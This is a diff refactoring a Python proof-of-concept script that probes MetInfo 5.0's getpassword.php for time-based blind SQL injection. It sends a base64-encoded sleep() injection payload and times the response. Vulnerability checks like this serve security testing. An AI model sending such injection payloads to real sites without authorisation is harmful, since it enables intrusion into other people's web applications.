@@ -11,14 +11,7 @@ import sys
 import time
 import requests
 import warnings
-
-  
-
-class getpassword_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['metinfo5.0 getpassword.php两处时间盲注漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,7 +20,7 @@ class getpassword_sqli:
                     r"/admin/admin/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x"]
 
         for payload in payloads:
-            vulnurl = self.url + payload
+            vulnurl = url + payload
             start_time = time.time()
 
             try:
@@ -44,5 +37,4 @@ class getpassword_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = getpassword_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
